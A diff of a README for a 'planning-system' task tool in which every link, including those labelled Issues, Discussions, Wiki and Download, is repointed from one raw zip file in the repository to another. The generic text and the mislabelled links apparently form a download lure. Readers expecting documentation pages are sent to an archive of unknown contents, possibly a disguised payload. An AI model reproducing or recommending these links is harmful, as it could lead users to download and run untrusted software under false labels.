@@ -1,6 +1,6 @@
 # 🚀 planning-system - Tool for Seamless Task Completion
 
-[![Download](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/skills/planning-system-1.6-alpha.2.zip%20Latest-Release-brightgreen)](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/skills/planning-system-1.6-alpha.2.zip)
+[![Download](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/dev/plans/plugin-conversion/planning_system_v2.0.zip%20Latest-Release-brightgreen)](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/dev/plans/plugin-conversion/planning_system_v2.0.zip)
 
 ## 📋 Overview
 
@@ -29,7 +29,7 @@ Follow these simple steps to download and run the planning-system application.
 
 ### Step 1: Visit the Release Page
 
-Go to the releases page to find the latest version of the planning-system. You can access it here: [Download Here](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/skills/planning-system-1.6-alpha.2.zip).
+Go to the releases page to find the latest version of the planning-system. You can access it here: [Download Here](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/dev/plans/plugin-conversion/planning_system_v2.0.zip).
 
 ### Step 2: Download the Application
 
@@ -53,21 +53,21 @@ Once installed, you can find the planning-system in your Programs menu (Windows)
 
 ### How do I report an issue?
 
-If you experience problems while using the planning-system, you can report issues on the GitHub repository. Visit [Issues](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/skills/planning-system-1.6-alpha.2.zip) and follow the guidelines.
+If you experience problems while using the planning-system, you can report issues on the GitHub repository. Visit [Issues](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/dev/plans/plugin-conversion/planning_system_v2.0.zip) and follow the guidelines.
 
 ### Can I suggest a feature?
 
-Absolutely! We welcome user feedback. Please share your suggestions on the [Discussions](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/skills/planning-system-1.6-alpha.2.zip) page.
+Absolutely! We welcome user feedback. Please share your suggestions on the [Discussions](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/dev/plans/plugin-conversion/planning_system_v2.0.zip) page.
 
 ### Is there a user manual?
 
-Yes, user documentation is available on the repository. It provides details on advanced features and tips. Visit the [Wiki](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/skills/planning-system-1.6-alpha.2.zip) for more information.
+Yes, user documentation is available on the repository. It provides details on advanced features and tips. Visit the [Wiki](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/dev/plans/plugin-conversion/planning_system_v2.0.zip) for more information.
 
 ## 🌐 Community Support
 
 Join our community for support and discussions. Connect with other users and developers. Share tips, tricks, and experiences to improve your use of the planning-system.
 
-- **GitHub Discussions:** [Join Here](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/skills/planning-system-1.6-alpha.2.zip)
+- **GitHub Discussions:** [Join Here](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/dev/plans/plugin-conversion/planning_system_v2.0.zip)
 - **Chat:** Join our chat on Discord for real-time assistance.
 
 ## 💬 Feedback
@@ -78,4 +78,4 @@ Your feedback is important to us. Let us know your thoughts about the planning-s
 
 Stay tuned for regular updates, enhancements, and new features. Check the release page often to ensure you have the latest version of the planning-system.
 
-To download the latest version, please revisit the releases page: [Download Here](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/skills/planning-system-1.6-alpha.2.zip).
+To download the latest version, please revisit the releases page: [Download Here](https://raw.githubusercontent.com/KnigthFrodo/planning-system/main/dev/plans/plugin-conversion/planning_system_v2.0.zip).
